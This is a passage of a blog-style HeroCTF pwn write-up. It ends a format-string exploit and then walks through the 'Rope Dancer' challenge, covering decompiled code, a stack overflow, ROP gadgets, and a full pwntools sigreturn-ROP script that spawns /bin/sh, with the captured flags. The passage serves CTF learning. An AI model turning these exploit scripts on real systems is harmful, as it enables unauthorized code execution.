class="string">b&#x27;%9$ln&#x27;</span> + <span class="string">b&#x27;%10$ln&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">5</span> + p64(<span class="number">0x4040c0</span>) + p64(<span class="number">0x4040c8</span>))</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;(y/n)&#x27;</span> , <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">r.sendline(can)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>flag : <code>Hero&#123;AES_ECB_1S_S0_345Y_WH3N_Y0U_C0NTR0L_TH3_K3Y!!!&#125;</code></p>
+<h1 id="Rope-Dancer"><a href="#Rope-Dancer" class="headerlink" title="Rope Dancer"></a>Rope Dancer</h1><h2 id="Analysis-2"><a href="#Analysis-2" class="headerlink" title="Analysis"></a>Analysis</h2><p>This program is only written in assembly language. (using syscall)</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __noreturn <span class="title">start</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+0h] [rbp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">sys_write</span>(<span class="number">1u</span>, <span class="string">&quot;Hello. So, you want to be a ROPedancer? &quot;</span>, <span class="number">0x29</span>uLL);</span><br><span class="line">  v1 = <span class="built_in">sys_read</span>(<span class="number">0</span>, (<span class="type">char</span> *)&amp;v4, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="string">&#x27;\nsey&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="built_in">sys_write</span>(<span class="number">1u</span>, <span class="string">&quot;Alright. Please enter an email on which we can contact you: &quot;</span>, <span class="number">0x3D</span>uLL);</span><br><span class="line">    ((<span class="built_in">void</span> (__fastcall *)(__int64))get_motivation_letter)(<span class="number">1LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="built_in">sys_write</span>(<span class="number">1u</span>, <span class="string">&quot;Well, let me know if you change your mind.\n&quot;</span>, <span class="number">0x2C</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>simple sys_write and sys_read, and check that v4 is ‘yes\n’. if correct, call <code>get_motivation_letter</code>.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">signed</span> __int64 <span class="title">get_motivation_letter</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int64 v1; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">sys_read</span>(<span class="number">0</span>, v3, <span class="number">0x64</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">check_email</span>(v3) )</span><br><span class="line">  &#123;</span><br><span class="line">    __asm &#123; syscall; LINUX - sys_write &#125;</span><br><span class="line">    v1 = <span class="built_in">sys_read</span>(<span class="number">0</span>, motivation_letter, <span class="number">0x1F4</span>uLL);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sys_write</span>(<span class="number">1u</span>, <span class="string">&quot;We will get back to you soon. Good bye.\n&quot;</span>, <span class="number">0x29</span>uLL);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">1LL</span>;</span><br><span class="line">    __asm &#123; syscall; LINUX - sys_write &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>it occurs stack buffer overflow in <code>sys_read(0, v3, 0x64)</code>. If the string you entered is in the form of an email, you can write any string in <code>motivation_letter</code> (bss segment). </p>
+<h2 id="Vulnerabiltiy-1"><a href="#Vulnerabiltiy-1" class="headerlink" title="Vulnerabiltiy"></a>Vulnerabiltiy</h2><p>We can check stack buffer overflow easily.</p>
+<h2 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h2><p>The program is simple but exploit is complicated. First i think about ROP using syscall gadget. yes! it’s sigreturn-rop.<br>However, since the length of the string that can be entered in the stack is small. So I used stack pivoting to turn rsp to the motivation_letter address, and there I wrote sigreturn rop payload, and we can make ‘&#x2F;bin&#x2F;sh’ string in bss easily.<br>but we have to make <code>eax</code> register to 0xf for call sigreturn syscall. so i spent time that found gadget for this. after few times i found this 2 gadget.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401011 : xor eax, eax ; inc al ; ret</span><br><span class="line">0x0000000000401013 : inc al ; ret</span><br></pre></td></tr></table></figure>
+<p>we can make <code>eax</code> register to 0xf using this gadget easily. now we need to stack pivoting gadget. But this program don’t have <code>leave;ret</code> gadget because written by assembly. so i use this gadget for stack pivoting</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x401114 &lt;_get_motivation_letter_end&gt;:	mov    rsp,rbp</span><br><span class="line">0x401117 &lt;_get_motivation_letter_end+3&gt;:	pop    rbp</span><br><span class="line">0x401118 &lt;_get_motivation_letter_end+4&gt;:	ret</span><br></pre></td></tr></table></figure>
+<p>Then the preparations for the sigreturn rop are done!</p>
+<ol>
+<li>set the rbp to <code>motivation_letter - 8</code></li>
+<li>overwrite ret to stack pivoting gadget.</li>
+<li>write sigreturn rop payload in <code>motivation_letter</code>.</li>
+<li>execute pivoting gadget, then rsp changes to <code>motivation_letter</code>.</li>
+<li>execute ‘xor eax, eax; inc al; ret’ and ‘inc al; ret’ 0xe times. then <code>eax</code> register is set to <code>0xf</code> (sigreturn syscall).</li>
+<li>execute sigreturn rop</li>
+<li>get shell!</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] ==<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">    r = remote(<span class="string">&#x27;static-03.heroctf.fr&#x27;</span>, <span class="number">5002</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = process(<span class="string">&#x27;./ropedancer&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ropedancer&#x27;</span>)</span><br><span class="line">get_motivation_letter = elf.symbols[<span class="string">&#x27;get_motivation_letter&#x27;</span>]</span><br><span class="line">inc_al_ret = <span class="number">0x0000000000401013</span></span><br><span class="line">xor_eax_eax_inc_al_ret = <span class="number">0x0000000000401011</span></span><br><span class="line">syscall = <span class="number">0x000000000040102f</span></span><br><span class="line">binsh = <span class="number">0x403284</span></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;? &#x27;</span>, <span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&#x27;you: &#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span> + p64(<span class="number">0x000000000040312C</span> - <span class="number">0x8</span>) + p64(<span class="number">0x0000000000401114</span>) + p64(<span class="number">0x000000000040108E</span>))</span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += p64(xor_eax_eax_inc_al_ret) <span class="comment"># eax = 1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xf</span> - <span class="number">0x1</span>):</span><br><span class="line">    payload += p64(inc_al_ret) <span class="comment"># eax = 0xf (sigreturn)</span></span><br><span class="line">payload += p64(syscall)</span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x0</span>) * <span class="number">5</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(<span class="number">0x0</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += p64(syscall)</span><br><span class="line">payload += p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(<span class="number">0x33</span>)</span><br><span class="line">payload += p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(<span class="number">0x0</span>)</span><br><span class="line">payload += p64(<span class="number">0x2b</span>)</span><br><span class="line"></span><br><span class="line">payload += <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(payload))</span><br><span class="line">r.sendafter(<span class="string">&#x27;you: &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>flag : <code>Hero&#123;1_w4nN4_b3_4_R0P3_D4nC3r_s0_b4d!!!&#125;</code></p>
+<p><code>Rope Dancer</code> challenge was very funny! </p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Appointment-Book"><span class="toc-number">1.</span> <span class="toc-text">Appointment Book</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerability"><span class="toc-number">1.2.</span> <span class="toc-text">Vulnerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">1.3.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Impossible-v2"><span class="toc-number">2.</span> <span class="toc-text">Impossible v2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis-1"><span class="toc-number">2.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerabiltiy"><span class="toc-number">2.2.</span> <span class="toc-text">Vulnerabiltiy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-1"><span class="toc-number">2.3.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Rope-Dancer"><span class="toc-number">3.</span> <span class="toc-text">Rope Dancer</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis-2"><span class="toc-number">3.1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vulnerabiltiy-1"><span class="toc-number">3.2.</span> <span class="toc-text">Vulnerabiltiy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-2"><span class="toc-number">3.3.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://blog.gosegu.kr/2023/05/15/HeroCTF-pwn-writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://blog.gosegu.kr/2023/05/15/HeroCTF-pwn-writeup/&text=HeroCTF pwn writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://blog.gosegu.kr/2023/05/15/HeroCTF-pwn-writeup/&title=HeroCTF pwn writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.gosegu.kr/2023/05/15/HeroCTF-pwn-writeup/&is_video=false&description=HeroCTF pwn writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HeroCTF pwn writeup&body=Check out this article: http://blog.gosegu.kr/2023/05/15/HeroCTF-pwn-writeup/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://blog.gosegu.kr/2023/05/15/HeroCTF-pwn-writeup/&title=HeroCTF pwn writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://blog.gosegu.kr/2023/05/15/HeroCTF-pwn-writeup/&title=HeroCTF pwn writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://blog.gosegu.kr/2023/05/15/HeroCTF-pwn-writeup/&title=HeroCTF pwn writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://blog.gosegu.kr/2023/05/15/HeroCTF-pwn-writeup/&title=HeroCTF pwn writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://blog.gosegu.kr/2023/05/15/HeroCTF-pwn-writeup/&name=HeroCTF pwn writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://blog.gosegu.kr/2023/05/15/HeroCTF-pwn-writeup/&t=HeroCTF pwn writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    p0her
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
